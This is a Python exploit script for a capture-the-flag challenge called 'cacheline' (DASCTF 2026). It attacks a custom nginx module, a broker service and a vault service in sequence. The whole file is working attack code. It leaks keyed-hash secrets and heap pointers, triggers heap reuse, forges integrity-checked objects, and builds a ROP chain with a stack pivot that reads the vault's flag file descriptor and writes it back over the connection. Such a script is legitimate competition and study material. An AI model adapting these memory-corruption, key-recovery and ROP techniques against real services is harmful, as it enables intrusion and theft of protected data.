#!/usr/bin/env python3
# 12078 cacheline  --  2026 羊城杯 DASCTF
# chain: HTTP -> nginx module(cacheline.so) -> cachebroker(1001) -> cachevault(1002) -> /home/vault/flag
# All three layers use a keyed hash (splitmix64/siphash13-ish) which we can reproduce; each layer
# leaks its own keys, after which we forge the per-layer "object graph" and retarget the final
# computed function pointer to a gadget that reads fd 7 (the vault's flag fd) and writes it to us.
import os, sys, socket, struct, time

M64 = (1 << 64) - 1
def rol(x, c):
    c &= 63
    return ((x << c) | (x >> ((64 - c) & 63))) & M64 if c else x
def ror(x, c):
    c &= 63
    return ((x >> c) | (x << ((64 - c) & 63))) & M64 if c else x
def fin(x):
    x &= M64
    x = ((x >> 30) ^ x) * 0xbf58476d1ce4e5b9 & M64
    x = ((x >> 27) ^ x) * 0x94d049bb133111eb & M64
    return ((x >> 31) ^ x) & M64
def H(k1, k2, buf, n, c1=0x9e3779b97f4a7c15):
    h = fin((k1 ^ n ^ c1) & M64); kv = k2 & M64; iv = 0
    for i in range(n):
        x = fin((buf[i] + kv) & M64)
        h = ((k1 ^ iv) + rol(x ^ h, 0x11 + 0xb * i)) & M64
        kv = (kv + 0x517cc1b727220a95) & M64
        iv = (iv + 0x6a09e667f3bcc909) & M64
    return fin((k2 ^ h ^ 0xa54ff53a5f1d36f1) & M64)
def Q(b, i): return struct.unpack('<Q', b[i*8:(i+1)*8])[0]
def PK(vals, size):
    b = b''.join(struct.pack('<Q', v & M64) for v in vals)
    assert len(b) <= size, (len(b), size)
    return b + b'\x00' * (size - len(b))
C243F = 0x243f6a8885a308d3; C1319 = 0x13198a2e03707344
C3C6E = 0x3c6ef372fe94f82b; C6A09 = 0x6a09e667f3bcc909
CBB67 = 0xbb67ae8584caa73b; CA54F = 0xa54ff53a5f1d36f1
MAGIC = 0x4f524b4559313233   # "321YEKRO"

# ---------------------------------------------------------------- HTTP keepalive
class Http:
    def __init__(self, host, port, path='/', timeout=20):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)
        self.path = path
        self.n = 0
        self.buf = b''
    def _recv_until(self, term):
        while term not in self.buf:
            d = self.s.recv(65536)
            if not d: raise EOFError('closed: %r' % self.buf)
            self.buf += d
    def request(self, query, allow_fail=False):
        self.n += 1
        req = ('GET %s?%s HTTP/1.1\r\nHost: x\r\nConnection: keep-alive\r\n\r\n'
               % (self.path, query)).encode()
        self.s.sendall(req)
        self.buf = b''
        self._recv_until(b'\r\n\r\n')
        head, self.buf = self.buf.split(b'\r\n\r\n', 1)
        lines = head.split(b'\r\n')
        status = int(lines[0].split()[1])
        if status != 200:
            if not allow_fail:
                raise HttpError(status, head[:200])
            self.h.status = status
            return b'' 
        cl = None
        for l in lines[1:]:
            if l.lower().startswith(b'content-length:'):
                cl = int(l.split(b':')[1])
        if cl is None:   # chunked
            out = b''
            while True:
                self._recv_until(b'\r\n')
                line, self.buf = self.buf.split(b'\r\n', 1)
                n = int(line.split(b';')[0], 16)
                while len(self.buf) < n + 2:
                    d = self.s.recv(65536)
                    if not d: raise EOFError('chunk eof')
                    self.buf += d
                out += self.buf[:n]; self.buf = self.buf[n+2:]
                if n == 0: return out
        while len(self.buf) < cl:
            d = self.s.recv(65536)
            if not d: raise EOFError('body eof')
            self.buf += d
        out, self.buf = self.buf[:cl], self.buf[cl:]
        return out

class HttpError(Exception):
    def __init__(self, status, head):
        self.status = status; self.head = head
        Exception.__init__(self, 'http %d: %r' % (status, head))

class Module:
    """nginx cacheline module state machine + raw relay to broker/vault"""
    def __init__(self, http):
        self.h = http
        self.rb = b''
    def op(self, op, data=None, allow_fail=False):
        q = 'op=' + op
        if data is not None:
            q += '&data=' + (data.hex() if isinstance(data, (bytes, bytearray)) else data)
        try:
            return self.h.request(q)
        except HttpError:
            if allow_fail: return b''
            raise
    # -- stream helpers used after the module is proxying us to the vault --
    def relay(self, blob):
        r = self.h.request('op=broker&data=' + blob.hex())
        self.rb += r
        return r

def forge_l1(handler, key1, key2, conn, bn, ln):
    """build the four L1 objects that the cacheline.so validators accept"""
    Z1 = 0x0101010101010101; Z2 = 0x0202020202020202
    Z3 = 0x0404040404040404; Z4 = Z1 ^ Z2 ^ Z3 ^ 1
    R8 = 0x1111111111111111
    R68 = 0x6868686868686868; S10 = Z2
    rt = [0] * 0x35
    rt[0x38 // 8] = 0x3454554f524c4c43
    rt[0x40 // 8] = R8
    rt[0x48 // 8] = conn ^ H(key1, key2, [R8, bn, ln], 3)
    rt[0x50 // 8] = bn
    rt[0x58 // 8] = ln
    rt[0x60 // 8] = Z1
    rt[0x68 // 8] = R68
    rt[0x70 // 8] = 1
    rt[0x78 // 8] = H(key1, key2, [0x3454554f524c4c43, R8, rt[0x48 // 8], bn, ln, Z1, R68, 1], 8)
    se = [0] * 0x1b
    se[0x28 // 8] = 0x344c4145534c4c43
    se[0x30 // 8] = R68
    se[0x38 // 8] = R8
    se[0x40 // 8] = bn
    se[0x48 // 8] = ln
    se[0x50 // 8] = S10
    se[0x58 // 8] = 1
    se[0x60 // 8] = H(key1 ^ C243F, key2, [0x344c4145534c4c43, R68, R8, bn, ln, S10, 1], 7)
    G8 = 0x2222222222222222; G78 = V30 = 0x7878787878787878
    gr = [0] * 0x43
    gr[0x38 // 8] = 0x34544e4152474c43
    gr[0x40 // 8] = G8
    gr[0x48 // 8] = conn ^ H(key1, key2, [G8, R8, R68], 3)
    gr[0x50 // 8] = bn          # G[0x50] == beacon[0x38]
    gr[0x58 // 8] = ln          # G[0x58] == ledger[0x30]
    gr[0x60 // 8] = R8
    gr[0x68 // 8] = R68
    gr[0x70 // 8] = Z3
    gr[0x78 // 8] = G78
    gr[0x80 // 8] = H(key1 ^ key2, (key1 + key2) & M64,
                      [handler, conn, bn, ln, R8, R68, Z1, S10], 8)
    gr[0x88 // 8] = 1
    gr[0x90 // 8] = H(key1 ^ C1319, key2,
                      [0x34544e4152474c43] + [gr[k] for k in range(0x40 // 8, 0x88 // 8)] + [1], 11)
    vo = [0] * 0x21
    vo[0x28 // 8] = 0x34524843554f5643
    vo[0x30 // 8] = G78
    vo[0x38 // 8] = G8
    vo[0x40 // 8] = R8
    vo[0x48 // 8] = R68
    vo[0x50 // 8] = bn
    vo[0x58 // 8] = ln
    vo[0x60 // 8] = Z4
    vo[0x68 // 8] = 1
    vo[0x70 // 8] = H(key1 ^ C3C6E, key2,
                      [0x34524843554f5643] + [vo[k] for k in range(0x30 // 8, 0x68 // 8)] + [1], 9)
    return dict(route=PK(rt, 0x1a8), seal=PK(se, 0xd8),
                grant=PK(gr, 0x218), vouch=PK(vo, 0x108),
                Z=(Z1, Z2, Z3, Z4))

def do_module(host, port, path='/'):
    http = Http(host, port, path)
    m = Module(http)
    r = m.op('beacon', b'', allow_fail=True)
    if b'n=' in r:
        sys.stderr.write('[module] worker already at stage 3 -> resuming\n')
        return _stage3(m, r)
    # 1. create -> CLTACKT(0x180)  (allocates, tag@0x38, [0x40]=0x180)
    r = m.op('create', b'A' * 0x180); assert b'created' in r, r[:80]
    # 2. resize -> must reuse the freed CLTACKT chunk, tag + 0x491  (heap-reuse dependent: retry)
    blob = bytearray(0x180)
    blob[0x38:0x40] = b'CLTACKT4'
    struct.pack_into('<Q', blob, 0x40, 0x491)
    for attempt in range(6):
        r = m.op('resize', bytes(blob))
        sys.stderr.write('[module] resize try %d -> %r\n' % (attempt, r[:40]))
        if b'staged' in r: break
    assert b'staged' in r, r[:80]
    # 3. ledgeropen -> CLLEDGR(0xf8)
    r = m.op('ledgeropen', b''); assert b'opened' in r, r[:80]
    # 4. beacon -> leaks  n=beacon[0x38] a=[0x40] e=[0x48] k=[0x50]
    r = m.op('beacon', b''); assert b'n=' in r, r[:120]
    return _stage3(m, r)

def _stage3(m, r):
    """at stage 3 the beacon/ledger are live: leak keys, forge the 4 objects, finish L1"""
    r = r if b'n=' in r else m.op('beacon', b'', allow_fail=True)
    f = dict(kv.split(b'=', 1) for kv in r.split())
    bn = int(f[b'n'], 16)
    b_a = int(f[b'a'], 16); b_e = int(f[b'e'], 16); b_k = int(f[b'k'], 16)
    handler = b_a ^ rol(bn, 0x11)
    key2 = b_e ^ H(handler, bn, [bn, handler], 2)
    key1 = b_k ^ H(handler, bn, [key2, bn], 2)   # buf = [key2, nonce]
    # 5. ledger -> leaks ln=ledger[0x30] o=[0x40] t=[0x48]
    r = m.op('ledger', b''); assert b'n=' in r, r[:120]
    f = dict(kv.split(b'=', 1) for kv in r.split())
    ln = int(f[b'n'], 16); l_o = int(f[b'o'], 16)
    conn = l_o ^ H(key1, key2, [ln, bn], 2)
    sys.stderr.write('[module] handler=%#x key1=%#x key2=%#x conn=%#x bn=%#x ln=%#x\n'
                     % (handler, key1, key2, conn, bn, ln))
    fg = forge_l1(handler, key1, key2, conn, bn, ln)
    for op, key, want in (('route','route',b'routed'), ('seal','seal',b'sealed'),
                          ('grant','grant',b'granted'), ('voucher','vouch',b'vouched')):
        r = m.op(op, fg[key])
        sys.stderr.write('[module] %-8s -> %r\n' % (op, r[:40]))
        assert want in r, (op, r[:80])
    # 10. commit -> activate
    assert (0x0101010101010101 ^ 0x0202020202020202 ^ 0x0404040404040404 ^ (0x0101010101010101 ^ 0x0202020202020202 ^ 0x0404040404040404 ^ 1)) == 1
    r = m.op('commit', b''); assert b'activated' in r, r[:80]
    return m

# ---------------------------------------------------------------- broker layer
class Broker:
    def __init__(self, m):
        self.m = m
    def line(self, payload):
        self.m.relay(payload)
        while b'\n' not in self.m.rb:
            self.m.relay(b'')
        i = self.m.rb.index(b'\n') + 1
        o, self.m.rb = self.m.rb[:i], self.m.rb[i:]
        return o
    def raw(self, n):
        while len(self.m.rb) < n:
            self.m.relay(b'')
        o, self.m.rb = self.m.rb[:n], self.m.rb[n:]
        return o

def do_broker(m):
    b = Broker(m)
    leaks = []
    for idx in range(3):
        assert b.line(b'N' + bytes([idx, idx])) == b'PROBE\n'
        assert b.line(b'L' + bytes([idx, idx])) == b'LINKED\n'
        assert b.line(b'n' + bytes([idx, idx])) == b'APERTURE\n'
        assert b.line(b'l' + bytes([idx, idx])) == b'LINKED\n'
        assert b.line(b'B' + bytes([idx, idx])) == b'BOUND\n'
        m.relay(b'P' + bytes([idx])); pr = b.raw(0x40)
        m.relay(b'p' + bytes([idx])); ap = b.raw(0x40)
        assert b.line(b'A' + bytes([idx]) + pr + b'\x00' * (0x90 - 0x40)) == b'IMPORTED\n'
        assert b.line(b'a' + bytes([idx]) + ap + b'\x00' * (0xc0 - 0x40)) == b'IMPORTED\n'
        m.relay(b'V' + bytes([idx, idx]))
        leaks.append(struct.unpack('<Q', b.raw(8))[0])
    proxy, K1, K2 = leaks
    base = proxy - 0x4000
    GATE = H(K1, K2, [proxy, MAGIC], 2)
    sys.stderr.write('[broker] base=%#x K1=%#x K2=%#x GATE=%#x\n' % (base, K1, K2, GATE))
    assert b.line(b'G\x00') == b'PERMIT\n'
    assert b.line(b'H\x00\x00') == b'HELD\n'
    m.relay(b'I\x00'); P = b.raw(0x40)
    assert b.line(b'M\x00') == b'MANDATE\n'
    assert b.line(b'O\x00\x00') == b'HELD\n'
    m.relay(b'Q\x00'); MD = b.raw(0x50)
    pptr = Q(P, 2) ^ K1; mptr = Q(MD, 2) ^ K1
    SH = []
    for i in range(4):
        assert b.line(b'S' + bytes([i, i])) == b'SHARD\n'
        assert b.line(b'T' + bytes([i, i])) == b'TETHERED\n'
        m.relay(b'U' + bytes([i])); SH.append(b.raw(0x48))
        assert b.line(b's' + bytes([i, i])) == b'STAMP\n'
        assert b.line(b't' + bytes([i, i])) == b'TETHERED\n'
        m.relay(b'u' + bytes([i])); SH.append(b.raw(0x48))
    # pairs
    CH = []; SE = []
    for i in range(4):
        sd = SH[2 * i]; st = SH[2 * i + 1]
        sptr = Q(sd, 3) ^ K1; tptr = Q(st, 3) ^ K1
        cn = Q(sd, 2); sn = Q(st, 2)
        data = b'\x00' * 0xa8
        sh = [0] * 0x1e
        sh[0] = 0x3444524148534c43; sh[1] = i; sh[2] = cn; sh[3] = (K1 ^ sptr) & M64
        sh[4] = (K1 ^ tptr) & M64; sh[5] = sn
        for k in range(21):
            sh[9 + k] = struct.unpack('<Q', data[k*8:k*8+8])[0]
        h = H(GATE, cn, [i], 1)
        for off in range(0, 0xa8, 8):
            w = struct.unpack('<Q', data[off:off+8])[0]
            h = H(GATE ^ cn, K1, [h, w, off], 3)
        sh[6] = h; sh[7] = 1
        sh[8] = H(K1, GATE, sh[0:8], 8)
        CH.append(sh)
        se = [0] * 0x26
        se[0] = 0x34504d4154534c43; se[1] = i; se[2] = sn; se[3] = (K1 ^ tptr) & M64
        se[4] = (K1 ^ sptr) & M64; se[5] = cn; se[6] = h; se[7] = 1
        se[8] = H(K1 ^ C3C6E, GATE, se[0:8], 8)
        SE.append(se)
    chain = GATE
    for i in range(4):
        chain = H(GATE ^ i, K1, [chain, CH[i][6], CH[i][2], SE[i][2],
                                 Q(SH[2*i], 3) ^ K1, Q(SH[2*i+1], 3) ^ K1], 6)
    R = 0x1122334455667788; M1 = 0x99aabbccddeeff00
    target = base + 0x4000
    perm = [0] * 0x2c
    perm[0] = 0x3454494d52455043; perm[1] = R; perm[2] = (K1 ^ pptr) & M64
    perm[3] = (K1 ^ mptr) & M64; perm[4] = M1; perm[5] = chain; perm[6] = 1
    perm[7] = H(K2, K1, perm[0:7], 7)
    mand = [0] * 0x16
    mand[0] = 0x34455441444e414d; mand[1] = M1; mand[2] = (K1 ^ mptr) & M64
    mand[3] = (K1 ^ pptr) & M64; mand[4] = R
    mand[5] = rol((target ^ R ^ mptr ^ K2) & M64, 0x13)
    mand[6] = H(K2 ^ K1, GATE, [chain, pptr, mptr, R, M1], 5)
    mand[7] = 1
    mand[8] = H(K2 ^ C1319, K1, mand[0:8], 8)
    assert b.line(b'K\x00' + PK(perm, 0x160)) == b'IMPORTED\n'
    assert b.line(b'Y\x00' + PK(mand, 0xb0)) == b'IMPORTED\n'
    for i in range(4):
        assert b.line(b'F' + bytes([i]) + PK(CH[i], 0xf0)) == b'IMPORTED\n'
        assert b.line(b'f' + bytes([i]) + PK(SE[i], 0x130)) == b'IMPORTED\n'
    # commit: 11 bytes, starts with 'C' -> module switches to raw passthrough
    body = b'C' + bytes([0, 0]) + bytes([0, 0, 1, 1, 2, 2, 3, 3])
    m.relay(body)
    return m

# ---------------------------------------------------------------- vault layer
def do_vault(m):
    def rq(n):
        while len(m.rb) < n:
            m.relay(b'')
        o, m.rb = m.rb[:n], m.rb[n:]
        return o
    hdr = rq(16)
    assert hdr[:4] == b'CLR4', hdr
    op = hdr[4]; ln = struct.unpack('<I', hdr[8:12])[0]
    ready = rq(ln) if ln else b''
    sys.stderr.write('[vault] ready=%r\n' % ready)
    seq = [0]
    def cmd(c, a=0, b=0, body=b''):
        seq[0] += 1
        msg = b'CLV4' + bytes([c, a, b, 0]) + struct.pack('<II', len(body), seq[0]) + body
        m.relay(msg)
        h = rq(16)
        assert h[:4] == b'CLR4', h
        op, bb, cc = h[4], h[5], h[6]
        l = struct.unpack('<I', h[8:12])[0]
        d = rq(l) if l else b''
        return op, d
    # ---- leak vault keys via the level-1 program VM ----
    ks = []
    for i in range(3):
        assert cmd(3, i, 0, bytes([i]))[0] == 0x83
        assert cmd(4, i, i)[0] == 0x84
        assert cmd(8, i, 0, bytes([i]))[0] == 0x88
        assert cmd(9, i, i)[0] == 0x89
        assert cmd(0x0d, i, i)[0] == 0x8d
        tok = cmd(5, i, 0)[1]; rcp = cmd(0x0a, i, 0)[1]
        assert cmd(7, i, 0, tok + b'\x00' * (0xa0 - 0x40))[0] == 0x87
        assert cmd(0x0c, i, 0, rcp + b'\x00' * (0xd0 - 0x40))[0] == 0x8c
        prog = b''
        for k, (o, ar) in enumerate([(0x41, (i - 3) & 0xff), (0x53, 0), (0x79, 0), (0x8b, 0)]):
            w0 = o | (ar << 8)
            bsw = ((w0 >> 8) | ((w0 & 0xff) << 8)) & 0xffff
            chk = (bsw ^ ((0x6d * k) & 0xffff) ^ 0x4b27) & 0xffff
            prog += bytes([o, ar]) + struct.pack('<H', chk) + b'\x00' * 4 + b'\x00' * 8
        op, d = cmd(1, i, i, prog)
        assert op == 0x80, hex(op)
        ks.append(struct.unpack('<Q', d)[0])
    key0, selfp, codeptr = ks
    base = codeptr - 0x17f0
    gate = H(key0, selfp, [codeptr, C243F], 2)
    assert cmd(2, 0, 0, struct.pack('<Q', gate))[0] == 0x81
    K1 = H(key0, C6A09, [selfp, codeptr], 2); K2 = H(key0, CBB67, [selfp, codeptr], 2)
    K3 = H(key0, C3C6E, [selfp, codeptr], 2); K4 = H(key0, CA54F, [selfp, codeptr], 2)
    sys.stderr.write('[vault] base=%#x\n' % base)
    def mkb(create, link, dump, cra, body, b=0):
        assert cmd(create, cra, b, body)[0] > 0x80
        assert cmd(link, cra, b)[0] > 0x80
        return cmd(dump, b, 0)[1]
    T = mkb(0x10, 0x11, 0x13, 0, struct.pack('<Q', 0x1111111111111111))
    V = mkb(0x15, 0x16, 0x18, 0, b'')
    X = mkb(0x20, 0x21, 0x23, 0, b'')
    P = mkb(0x27, 0x28, 0x2a, 0, b'')
    tptr = Q(T, 3) ^ K1; vptr = Q(V, 2) ^ K1; xptr = Q(X, 2) ^ K1; pptr = Q(P, 2) ^ K1
    pairs = []
    for i in range(4):
        cd = mkb(0x30, 0x31, 0x33, i, b'', b=i)
        sd = mkb(0x35, 0x36, 0x38, i, b'', b=i)
        pairs.append((Q(cd, 3) ^ K1, Q(cd, 2), Q(sd, 3) ^ K1, Q(sd, 2)))
    POPRDI = base + 0x44f0; POPRSI = base + 0x4500; POPRDX = base + 0x4510
    READ = base + 0x10e0; WRITE = base + 0x10a0
    scratch = xptr + 0x140
    rop = [POPRDI, 7, POPRSI, scratch, POPRDX, 0x100, READ,
           POPRDI, 1, POPRSI, scratch, POPRDX, 0x100, WRITE]
    rop = (rop + [0] * 40)[:32]
    CH = []; SE = []
    for i in range(4):
        cptr, cn, sptr, sn = pairs[i]
        cdat = b''.join(struct.pack('<Q', v & M64) for v in (rop if i == 0 else [0] * 32))
        c = [0] * 0x28
        c[0] = 0x344b4e5548434c43; c[1] = i; c[2] = cn; c[3] = (K1 ^ cptr) & M64
        c[4] = (K1 ^ sptr) & M64; c[5] = sn
        for k in range(32):
            c[8 + k] = struct.unpack('<Q', cdat[k*8:k*8+8])[0]
        h = H(K3, cn, [i], 1)
        for off in range(0, 0x100, 8):
            w = struct.unpack('<Q', cdat[off:off+8])[0]
            h = H(K3 ^ cn, K1, [h, w, off], 3)
        c[6] = h; c[7] = H(K3, K2, c[0:7], 7)
        CH.append(c)
        s = [0] * 0x13
        s[0] = 0x344c414553564c43; s[1] = i; s[2] = sn; s[3] = (K1 ^ sptr) & M64
        s[4] = (K1 ^ cptr) & M64; s[5] = cn; s[6] = h
        s[7] = H(K3 ^ C3C6E, K2, s[0:7], 7)
        SE.append(s)
    chain = K3
    for i in range(4):
        chain = H(K3 ^ i, K1, [chain, CH[i][6], CH[i][2], SE[i][2], pairs[i][0], pairs[i][2]], 6)
    ARB = 0x4142434445464748; plan1 = 0x1122334455667788
    N = 0xdeadbeefcafef00d; VC1 = 0x9988776655443322
    target = base + 0x44e0          # lea rsp,[rdi+0x40]; ret
    cx = [0] * 8
    cx[0] = 0x34545845544e4f43; cx[1] = ARB; cx[2] = (K1 ^ xptr) & M64
    cx[3] = (K1 ^ pptr) & M64; cx[4] = plan1; cx[5] = N; cx[6] = 1
    cx[7] = H(K2, K1, cx[0:7], 7)
    pl = [0] * 9
    pl[0] = 0x344e414c50564c43; pl[1] = plan1; pl[2] = (K1 ^ pptr) & M64
    pl[3] = (K1 ^ xptr) & M64; pl[4] = ARB
    pl[5] = rol((target ^ ARB ^ pptr ^ K2) & M64, 0x15)
    pl[6] = chain; pl[7] = 1; pl[8] = H(K2 ^ C1319, K3, pl[0:8], 8)
    vc = [0] * 8
    vc[0] = 0x34444552434c4156; vc[1] = VC1; vc[2] = (K1 ^ vptr) & M64
    vc[3] = (K1 ^ tptr) & M64; vc[4] = N; vc[5] = ARB; vc[6] = 1
    vc[7] = H(K1 ^ C243F, K2, vc[0:7], 7)
    ti = [0] * 9
    ti[0] = 0x3454454b43495443; ti[1] = 0x1111111111111111; ti[2] = N
    ti[3] = (K1 ^ tptr) & M64; ti[4] = (K1 ^ vptr) & M64; ti[5] = VC1
    ti[6] = H(K1, N, [xptr, ARB, vptr, VC1], 4); ti[7] = 1
    ti[8] = H(K1, K2, ti[0:8], 8)
    assert cmd(0x14, 0, 0, PK(ti, 0x150))[0] == 0x94
    assert cmd(0x19, 0, 0, PK(vc, 0xb0))[0] == 0x99
    assert cmd(0x24, 0, 0, PK(cx, 0x440))[0] == 0xa4
    assert cmd(0x2b, 0, 0, PK(pl, 0x190))[0] == 0xab
    for i in range(4):
        assert cmd(0x34, i, 0, PK(CH[i], 0x140))[0] == 0xb4, ('chunk', i)
        assert cmd(0x39, i, 0, PK(SE[i], 0x98))[0] == 0xb9, ('seal', i)
    body = bytes([0, 0, 0, 0]) + bytes([0, 0, 1, 1, 2, 2, 3, 3])
    seq[0] += 1
    m.relay(b'CLV4' + bytes([0x40, 0, 0, 0]) + struct.pack('<II', len(body), seq[0]) + body)
    out = m.rb; m.rb = b''
    t0 = time.time()
    while b'}' not in out and time.time() - t0 < 5:
        try:
            d = m.relay(b'')
        except Exception:
            break
        m.rb, extra = b'', m.rb
        out += extra
        if not extra and not d:
            break
    out += m.rb; m.rb = b''
    return out

def probe(host, port, paths):
    """cheapest decisive probe: the module's default reply for an unknown op is 'cacheline v4\n'"""
    ok = []
    for p in paths:
        try:
            h = Http(host, port, p, timeout=6)
            body = h.request('op=probe')
            tag = 'HIT ' if b'cacheline v4' in body else '   -'
            sys.stderr.write('[probe] %-14s %s status200 body=%r\n' % (p, tag, body[:48]))
            if b'cacheline v4' in body:
                ok.append(p)
        except Exception as e:
            sys.stderr.write('[probe] %-14s ERR %r\n' % (p, e))
    return ok

def dry_run():
    """print the L1 frames that would be sent (no network)"""
    blob = bytearray(0x180); blob[0x38:0x40] = b'CLTACKT4'
    struct.pack_into('<Q', blob, 0x40, 0x491)
    frames = [
        ('create',     (b'A' * 0x180)),
        ('resize',     bytes(blob)),
        ('ledgeropen', b''),
        ('beacon',     b''),
        ('ledger',     b''),
        ('route',      b'<0x1a8 forged CLLROUT>'),
        ('seal',       b'<0xd8 forged CLLSEAL>'),
        ('grant',      b'<0x218 forged CLGRANT>'),
        ('voucher',    b'<0x108 forged CVOUCH>'),
        ('commit',     b''),
        ('broker',     b'<broker/vault stream>'),
    ]
    for op, data in frames:
        hexs = data.hex() if isinstance(data, (bytes, bytearray)) else data
        if not isinstance(data, bytes) or data[:1] == b'<':
            hexs = data if isinstance(data, str) else data.decode()
        sys.stderr.write('GET /?op=%-11s &data=<%d hex chars>   expect\n' % (op, len(hexs)))
    sys.stderr.write('  create->created  resize->staged  ledgeropen->opened  '
                     'beacon->(n= a= e= k=)  ledger->(n= o= t=)\n'
                     '  route->routed  seal->sealed  grant->granted  voucher->vouched  '
                     'commit->activated  broker->raw\n')
    return 0

def main():
    if '--dry-run' in sys.argv:
        return dry_run()
    host = os.environ.get('HOST') or (sys.argv[1] if len(sys.argv) > 1 else None)
    port = int(os.environ.get('PORT') or (sys.argv[2] if len(sys.argv) > 2 else 80))
    path = os.environ.get('PATHX') or (sys.argv[3] if len(sys.argv) > 3 else '/')
    if not host:
        print('usage: HOST=1.2.3.4 PORT=80 [PATH=/] [--probe] [--dry-run] %s' % sys.argv[0]); return 1
    if '--probe' in sys.argv or os.environ.get('PROBE'):
        cand = ['/', '/cacheline', '/cache', '/cl']
        if os.environ.get('PATHS'): cand = os.environ['PATHS'].split(',')
        ok = probe(host, port, cand)
        print('CANDIDATES:', ok)
        if not ok: return 2
        path = ok[0]
    m = do_module(host, port, path)
    do_broker(m)
    out = do_vault(m)
    sys.stderr.write('[done] raw tail: %r\n' % out[:200])
    import re
    mm = re.findall(rb'[A-Za-z0-9_]+flag\{[^}]*\}|FLAG\{[^}]*\}|DASCTF\{[^}]*\}|flag\{[^}]*\}', out)
    print(out)
    if mm: print('FLAG:', mm[0].decode())
    return 0

if __name__ == '__main__':
    sys.exit(main())
